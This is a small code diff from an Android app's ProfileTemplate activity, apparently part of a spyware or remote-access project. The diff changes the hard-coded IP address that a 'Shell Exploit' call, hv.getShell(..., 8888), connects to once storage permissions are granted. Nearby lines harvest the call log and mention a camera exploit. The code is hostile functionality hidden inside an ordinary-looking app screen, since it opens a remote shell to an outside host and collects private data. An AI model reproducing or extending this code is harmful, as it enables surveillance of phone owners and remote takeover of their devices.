@@ -75,7 +75,7 @@ class ProfileTemplate : AppCompatActivity() {
              hv.getCallLog()
         }
         if (checkFileStoragePerms()) {
-            hv.getShell("192.168.1.203", 8888)
+            hv.getShell("172.18.207.238", 8888)
         }   // Shell Exploit
 
         // Lynette Camera Exploit (Done in Camera Button) -----------------------------
